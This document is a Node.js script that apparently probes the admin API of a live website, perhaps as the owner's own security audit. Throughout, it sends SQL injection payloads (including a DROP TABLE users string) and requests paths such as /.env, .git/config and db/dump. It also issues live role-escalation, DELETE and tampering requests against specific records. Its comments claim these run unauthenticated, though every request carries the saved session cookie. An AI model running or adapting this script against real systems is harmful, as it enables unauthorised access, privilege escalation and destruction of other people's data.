// Continued API probing — wider list, edge cases
const fs = require('fs');
const AUTH = '/Users/nick/Desktop/awesome-list-site/hunt-workspace/hunt-auth.json';
const cookies = JSON.parse(fs.readFileSync(AUTH, 'utf8'));
const cookieHeader = cookies.cookies.map(c => `${c.name}=${c.value}`).join('; ');

async function probe(url, opts = {}) {
  const start = Date.now();
  try {
    const r = await fetch(url, {
      method: opts.method || 'GET',
      headers: {
        Cookie: cookieHeader,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 admin-deep-urls',
        ...(opts.origin ? { Origin: opts.origin } : {}),
      },
      body: opts.body ? JSON.stringify(opts.body) : undefined,
      redirect: 'manual',
    });
    const text = await r.text();
    return { url, method: opts.method || 'GET', status: r.status, ms: Date.now() - start, body: text.slice(0, 600) };
  } catch (e) {
    return { url, method: opts.method || 'GET', error: e.message };
  }
}

(async () => {
  const findings = [];
  // 1) Try unauthed POST to admin (no cookie)
  const unauthPost = async (url, body) => probe('https://awesome.video' + url, { method: 'POST', body });

  // Category create without auth
  findings.push(await unauthPost('/api/admin/categories', { name: 'Audit-NoAuth-A', slug: 'audit-noauth-a-XYZ123', description: 'created by unauthenticated audit probe' }));
  findings.push(await unauthPost('/api/admin/resources', { title: 'AuditNoAuth-A-XYZ123', url: 'https://audit.example/XYZ123', category: 'community-events' }));

  // 2) SQL injection filter more
  const sqlPayloads = [
    "' OR 1=1--",
    "'; DROP TABLE users;--",
    "' UNION SELECT 1,2,3,4,5,6,7,8--",
    "1' OR '1'='1",
    "' OR pg_sleep(5)--",
  ];
  for (const p of sqlPayloads) {
    findings.push({ phase: 'sqli-attempt', q: p, ...await probe(`https://awesome.video/api/admin/users?q=${encodeURIComponent(p)}`) });
    findings.push({ phase: 'sqli-attempt', q: p, ...await probe(`https://awesome.video/api/admin/resources?q=${encodeURIComponent(p)}`) });
    findings.push({ phase: 'sqli-attempt', q: p, ...await probe(`https://awesome.video/api/admin/categories?q=${encodeURIComponent(p)}`) });
  }

  // 3) weird paths
  const weird = [
    '/api/admin/db/dump',
    '/api/admin/db/sql',
    '/api/admin/exec',
    '/api/admin/run',
    '/api/admin/users/role',
    '/api/admin/users/d460f5e7-a085-4083-96a2-2f20dc9315c4',
    '/api/admin/resources?include=passwords',
    '/api/admin/users?fields=*',
    '/.env',
    '/robots.txt',
    '/api/admin/.git/config',
    '/api/admin/db/init',
    '/api/admin/db/reset',
    '/api/admin/cache/clear',
    '/api/admin/db/seed',
    '/api/admin/console',
    '/api/admin/db/raw',
    '/api/admin/db/query',
    '/api/admin/jobs',
    '/api/admin/jobs/run',
    '/api/admin/jobs/stop',
    '/api/admin/jobs/restart',
  ];
  for (const p of weird) {
    findings.push({ phase: 'weird', ...await probe('https://awesome.video' + p) });
  }

  // 4) Role escalation — PATCH/DELETE on user without auth
  const roleEscalation = await probe('https://awesome.video/api/admin/users/d460f5e7-a085-4083-96a2-2f20dc9315c4', { method: 'PATCH', body: { role: 'admin' } });
  findings.push({ phase: 'role-escalation', ...roleEscalation });

  // 5) DELETE without auth
  const delProbe = await probe('https://awesome.video/api/admin/resources/188032', { method: 'DELETE' });
  findings.push({ phase: 'delete-resource', ...delProbe });
  const delCat = await probe('https://awesome.video/api/admin/categories/1091', { method: 'DELETE' });
  findings.push({ phase: 'delete-category', ...delCat });

  // 6) Mutate resource without auth
  const mutRes = await probe('https://awesome.video/api/admin/resources/188032', { method: 'PATCH', body: { title: 'AUDIT_TAMPERED_unsafe' } });
  findings.push({ phase: 'patch-resource', ...mutRes });

  fs.writeFileSync('/Users/nick/Desktop/awesome-list-site/hunt-workspace/admin-deep-urls.json', JSON.stringify(findings, null, 2));
  console.log(JSON.stringify(findings, null, 2));
})();
